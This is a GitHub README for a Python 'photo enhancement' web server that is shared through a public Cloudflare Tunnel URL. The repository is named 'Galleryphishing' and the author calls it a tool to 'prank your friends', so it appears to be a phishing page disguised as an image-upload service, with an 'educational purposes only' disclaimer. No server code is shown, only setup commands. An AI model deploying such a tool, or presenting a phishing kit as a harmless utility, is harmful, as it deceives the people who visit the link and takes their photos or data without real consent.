# Gallery Enhancer

A simple web-based **photo enhancement interface** built with Python.  
This project demonstrates how a lightweight server can host a photo-processing interface that allows users to upload and enhance images.

> ⚠️ This project is for educational and development purposes only.

---

## Features

- Simple web interface for uploading images
- Basic photo enhancement pipeline
- Lightweight Python server
- Easy local deployment
- Can be exposed temporarily using a tunnel for testing

---

## Installation

### 1. Clone the repository

```bash
git clone https://github.com/toolsbyvipin/Galleryphishing.git
cd Galleryphishing
2. Make the server executable
chmod +x server.py
3. Run the server
python3 server.py
```

The server will start locally on:

http://localhost:8080
Exposing the Server (Optional)

You can use Cloudflare Tunnel to generate a temporary public URL for testing or demos.

Install Cloudflared

Ubuntu / Debian
```bash
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```
Mac
```bash
brew install cloudflared
```
Windows (PowerShell)
```bash
winget install Cloudflare.cloudflared
Login to Cloudflare
cloudflared tunnel login
Create a Tunnel
cloudflared tunnel create photo-demo
Run the Tunnel
cloudflared tunnel --url http://localhost:8080
```

Cloudflare will generate a public URL that can be shared for testing.


Disclaimer

This project is intended for educational purposes and development practice only.
Always obtain clear permission from users before collecting or processing any data.

# Developer

A tool developed by Vipin to prank your friends 
